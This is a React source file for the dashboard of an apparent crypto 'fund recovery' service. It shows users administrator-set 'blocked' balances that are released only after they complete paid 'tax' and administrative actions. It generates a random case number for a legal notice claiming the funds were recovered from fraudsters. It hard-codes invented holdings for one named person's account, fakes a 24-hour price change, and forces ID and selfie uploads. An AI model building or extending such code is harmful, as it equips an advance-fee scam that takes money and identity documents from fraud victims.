import { useEffect, useState, useRef } from "react";
import { useNavigate } from "@/lib/router-compat";
import { useTranslation } from "react-i18next";
import Sidebar from "@/components/dashboard/Sidebar";
import MobileNav from "@/components/dashboard/MobileNav";
import ClientHeader from "@/components/dashboard/ClientHeader";
import RequiredActions, { AdminAction } from "@/components/dashboard/RequiredActions";
import WalletAddresses from "@/components/dashboard/WalletAddresses";
import LegalNotice from "@/components/dashboard/LegalNotice";
import AnnouncementBanner from "@/components/dashboard/AnnouncementBanner";
import QuickActions from "@/components/dashboard/QuickActions";
import MarketNews from "@/components/dashboard/MarketNews";
import LearningCenter from "@/components/dashboard/LearningCenter";
import SecurityStatus from "@/components/dashboard/SecurityStatus";
import RecentActivity from "@/components/dashboard/RecentActivity";
import PriceTicker from "@/components/dashboard/PriceTicker";
import PortfolioChart from "@/components/dashboard/PortfolioChart";
import BalanceCards from "@/components/dashboard/BalanceCards";
import CryptoListPro from "@/components/dashboard/CryptoListPro";
import AssetAllocation from "@/components/dashboard/AssetAllocation";
import DashboardFooter from "@/components/dashboard/DashboardFooter";
import DepositDialog from "@/components/dashboard/DepositDialog";
import { useCryptoPrices } from "@/hooks/useCryptoPrices";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { getCryptoPriceEur } from "@/lib/crypto-prices";
import { Loader2 } from "lucide-react";

interface Profile {
  id: string;
  email: string;
  first_name: string | null;
  last_name: string | null;
  kyc_status: string | null;
  kyc_selfie_url: string | null;
  kyc_document_front_url: string | null;
  occupation: string | null;
  available_balance: number;
  blocked_balance: number;
}

interface TransactionRecord {
  type: string;
  amount: number;
  crypto_symbol: string | null;
  crypto_amount: number | null;
}

interface WalletAddress {
  id: string;
  crypto_name: string;
  crypto_symbol: string;
  address: string;
}

interface RequiredActionDB {
  id: string;
  title: string;
  description: string | null;
  amount: number | null;
  currency: string | null;
  crypto_symbol: string | null;
  status: string | null;
  due_date: string | null;
}

const Dashboard = () => {
  const { t } = useTranslation('dashboard');
  const actionsRef = useRef<HTMLDivElement>(null);
  const { prices, isLoading: pricesLoading } = useCryptoPrices();
  const { user, isLoading: authLoading } = useAuth();
  const navigate = useNavigate();

  const [profile, setProfile] = useState<Profile | null>(null);
  const [wallets, setWallets] = useState<WalletAddress[]>([]);
  const [actions, setActions] = useState<RequiredActionDB[]>([]);
  const [transactions, setTransactions] = useState<TransactionRecord[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [depositOpen, setDepositOpen] = useState(false);

  const handleDepositClick = async () => {
    if (!user) return;
    const { data } = await supabase
      .from('client_deposit_info' as any)
      .select('id')
      .eq('user_id', user.id)
      .maybeSingle();
    if (data) setDepositOpen(true);
    // silently do nothing if no info configured
  };

  useEffect(() => {
    if (!authLoading && !user) {
      navigate("/login");
    }
  }, [user, authLoading, navigate]);

  useEffect(() => {
    if (user) {
      fetchUserData();
    }
  }, [user]);

  const fetchUserData = async () => {
    if (!user) return;

    try {
      const { data: profileData, error: profileError } = await supabase
        .from('profiles')
        .select('*')
        .eq('id', user.id)
        .maybeSingle();

      if (profileError) throw profileError;
      setProfile(profileData);

      // Gate access: enforce fiscal profile + KYC document upload before showing dashboard
      if (profileData) {
        if (!profileData.occupation) {
          navigate("/fiscal-profile", { replace: true });
          return;
        }
        if (!profileData.kyc_document_front_url) {
          navigate("/kyc", { replace: true });
          return;
        }
      }

      const { data: walletsData } = await supabase
        .from('wallet_addresses')
        .select('*')
        .eq('user_id', user.id);

      setWallets(walletsData || []);

      const { data: actionsData } = await supabase
        .from('required_actions')
        .select('*')
        .eq('user_id', user.id)
        .order('sort_order');

      setActions(actionsData || []);

      // Fetch transactions to compute crypto breakdowns
      const { data: txData } = await supabase
        .from('transactions')
        .select('type, amount, crypto_symbol, crypto_amount')
        .eq('user_id', user.id);

      setTransactions(txData || []);
    } catch (error) {
      console.error('Error fetching user data:', error);
    } finally {
      setIsLoading(false);
    }
  };

  if (authLoading || isLoading) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-background">
        <div className="flex flex-col items-center gap-3">
          <Loader2 className="h-8 w-8 animate-spin text-primary" />
          <p className="text-sm text-muted-foreground">{t('loading')}</p>
        </div>
      </div>
    );
  }

  if (!user || !profile) {
    return null;
  }

  const walletData = wallets.map(w => ({
    name: w.crypto_name,
    symbol: w.crypto_symbol,
    address: w.address,
    gradient: w.crypto_symbol === 'BTC' ? 'from-orange-500 to-orange-600' :
              w.crypto_symbol === 'ETH' ? 'from-blue-500 to-blue-600' :
              w.crypto_symbol === 'SOL' ? 'from-purple-500 to-purple-600' :
              w.crypto_symbol === 'BNB' ? 'from-yellow-500 to-yellow-600' :
              'from-green-500 to-green-600',
  }));

  const requiredActions = actions.map(a => ({
    id: a.id,
    title: a.title,
    description: a.description || '',
    type: 'tax' as const,
    amount: a.amount || undefined,
    currency: a.currency === 'CRYPTO' ? (a.crypto_symbol || 'ETH') : (a.currency || 'EUR'),
    status: (a.status as 'pending' | 'urgent' | 'completed') || 'pending',
    dueDate: a.due_date || undefined,
    template_id: (a as any).template_id ?? null,
    translations: (a as any).translations ?? null,
  }));

  const legalNotice = profile.blocked_balance > 0
    ? `Case Reference: #RCV-${new Date().getFullYear()}-${Math.floor(Math.random() * 100000)}. Your recovered funds are subject to regulatory requirements. The funds were successfully traced and recovered from fraudulent accounts. To release these assets, you must complete all required administrative actions including identity verification, insurance coverage, and applicable tax declarations. Contact our compliance team for assistance.`
    : '';

  const availableBalance = parseFloat(profile.available_balance?.toString() || '0');
  const blockedBalance = parseFloat(profile.blocked_balance?.toString() || '0');
  const totalBalance = availableBalance + blockedBalance;

  // Compute crypto breakdowns from transactions
  const computeCryptoBreakdowns = () => {
    const availableMap: Record<string, number> = {};
    const blockedMap: Record<string, number> = {};

    for (const tx of transactions) {
      if (!tx.crypto_symbol) continue;
      const sym = tx.crypto_symbol.toUpperCase();
      // Use crypto_amount (actual qty) if available, otherwise skip (EUR amount is not a crypto qty)
      const qty = tx.crypto_amount;
      if (!qty || qty <= 0) continue;
      
      if (tx.type === 'available_add' || tx.type === 'deposit') {
        availableMap[sym] = (availableMap[sym] || 0) + qty;
      } else if (tx.type === 'available_remove' || tx.type === 'withdrawal') {
        availableMap[sym] = (availableMap[sym] || 0) - qty;
      } else if (tx.type === 'blocked_add') {
        blockedMap[sym] = (blockedMap[sym] || 0) + qty;
      } else if (tx.type === 'blocked_remove') {
        blockedMap[sym] = (blockedMap[sym] || 0) - qty;
      }
    }

    const toArray = (map: Record<string, number>) =>
      Object.entries(map)
        .filter(([, amount]) => amount > 0)
        .map(([symbol, amount]) => ({ symbol, amount }));

    let availableCryptosArr = toArray(availableMap);
    let blockedCryptosArr = toArray(blockedMap);

    // Special case: Philippe Trepagny displays balances entirely in ETH (real-time price)
    const isPhilippeTrepagny = profile.id === 'beec95fa-8b00-40e6-aee0-732b9ec2ca65';
    const ethPrice = getCryptoPriceEur(prices.find(p => p.symbol === 'eth'));
    const btcPrice = getCryptoPriceEur(prices.find(p => p.symbol === 'btc'));

    if (isPhilippeTrepagny) {
      // Fixed display for Philippe Trepagny
      availableCryptosArr = [
        { symbol: 'ETH', amount: 4.9416 },
        { symbol: 'BTC', amount: 2.17864 },
      ];
      blockedCryptosArr = blockedBalance > 0 && ethPrice > 0
        ? [{ symbol: 'ETH', amount: blockedBalance / ethPrice }]
        : [];
    } else {
      // Always express the full balance in crypto: cover any EUR-only remainder with BTC
      const priceOf = (symbol: string) =>
        getCryptoPriceEur(prices.find(p => p.symbol.toUpperCase() === symbol.toUpperCase()));

      const coveredValue = (arr: { symbol: string; amount: number }[]) =>
        arr.reduce((sum, c) => sum + c.amount * priceOf(c.symbol), 0);

      const addRemainder = (arr: { symbol: string; amount: number }[], balance: number) => {
        if (balance <= 0 || btcPrice <= 0) return;
        const remainder = balance - coveredValue(arr);
        // ignore rounding noise (< 1 cent)
        if (remainder <= 0.01) return;
        const existingBtc = arr.find(c => c.symbol === 'BTC');
        if (existingBtc) existingBtc.amount += remainder / btcPrice;
        else arr.push({ symbol: 'BTC', amount: remainder / btcPrice });
      };

      addRemainder(blockedCryptosArr, blockedBalance);
      addRemainder(availableCryptosArr, availableBalance);
    }

    return { availableCryptos: availableCryptosArr, blockedCryptos: blockedCryptosArr };
  };

  const { availableCryptos, blockedCryptos } = computeCryptoBreakdowns();

  return (
    <div className="flex min-h-screen bg-background w-full overflow-x-hidden">
      <Sidebar />
      <div className="flex-1 min-w-0 flex flex-col">
        {/* Price Ticker */}
        <PriceTicker />
        
        <MobileNav />
        
        <main className="flex-1 p-3 sm:p-4 lg:p-6 max-w-full overflow-hidden">
          {/* Client Header */}
          <ClientHeader 
            firstName={profile.first_name || ''}
            lastName={profile.last_name || ''}
            email={profile.email}
            isVerified={profile.kyc_status === 'verified'}
            selfieUrl={profile.kyc_selfie_url}
          />

          {/* Announcement Banner */}
          <AnnouncementBanner />

          {/* Legal Notice Section */}
          {legalNotice && (
            <div className="mb-4 sm:mb-6">
              <LegalNotice notice={legalNotice} />
            </div>
          )}

          {/* Balance Cards - Simplified */}
          <div className="mb-4 sm:mb-6">
            <BalanceCards 
              availableBalance={availableBalance} 
              blockedBalance={blockedBalance}
              onUnlockClick={() => actionsRef.current?.scrollIntoView({ behavior: 'smooth' })}
              availableCryptos={availableCryptos}
              blockedCryptos={blockedCryptos}
            />
          </div>

          {/* Required Actions - Primary Focus - Always visible when funds are blocked */}
          {(requiredActions.length > 0 || blockedBalance > 0) && (
            <div ref={actionsRef} className="mb-4 sm:mb-6">
              <RequiredActions actions={requiredActions} blockedBalance={blockedBalance} />
            </div>
          )}

          {/* Portfolio Chart & Asset Allocation */}
          <div className="grid gap-3 sm:gap-4 lg:grid-cols-3 mb-4 sm:mb-6">
            <div className="lg:col-span-2">
              <PortfolioChart 
                totalValue={totalBalance} 
                change24h={2.34}
              />
            </div>
            <div className="space-y-3 sm:space-y-4">
              {(() => {
                const btcPx = getCryptoPriceEur(prices.find(p => p.symbol === 'btc'));
                const ethPx = getCryptoPriceEur(prices.find(p => p.symbol === 'eth'));
                const isPhilippe = profile.id === 'beec95fa-8b00-40e6-aee0-732b9ec2ca65';
                return (
                  <AssetAllocation
                    customHoldings={
                      isPhilippe && btcPx > 0 && ethPx > 0
                        ? [
                            { symbol: 'BTC', name: 'Bitcoin', amount: 2.17864, price: btcPx, color: '#f7931a' },
                            { symbol: 'ETH', name: 'Ethereum', amount: 4.9416, price: ethPx, color: '#627eea' },
                          ]
                        : undefined
                    }
                  />
                );
              })()}
            </div>


          </div>

          {/* Quick Actions */}
          <div className="mb-4 sm:mb-6">
            <QuickActions onDepositClick={handleDepositClick} />
          </div>

          {/* Main Grid - Crypto Markets */}
          <div className="grid gap-3 sm:gap-4 lg:grid-cols-3 mb-4 sm:mb-6">
            <div className="lg:col-span-2">
              <CryptoListPro prices={prices} isLoading={pricesLoading} />
            </div>
            <div className="space-y-3 sm:space-y-4">
              <SecurityStatus />
              <WalletAddresses wallets={walletData} />
            </div>
          </div>

          {/* Activity & News */}
          <div className="grid gap-3 sm:gap-4 lg:grid-cols-3 mb-4 sm:mb-6">
            <div className="lg:col-span-2">
              <RecentActivity />
            </div>
            <div>
              <MarketNews />
            </div>
          </div>

          {/* Learning Center - Full Width */}
          <div className="mb-4 sm:mb-6">
            <LearningCenter />
          </div>
        </main>

        {/* Dashboard Footer */}
        <DashboardFooter />
      </div>
      <DepositDialog open={depositOpen} onOpenChange={setDepositOpen} userId={user.id} />
    </div>
  );
};

export default Dashboard;
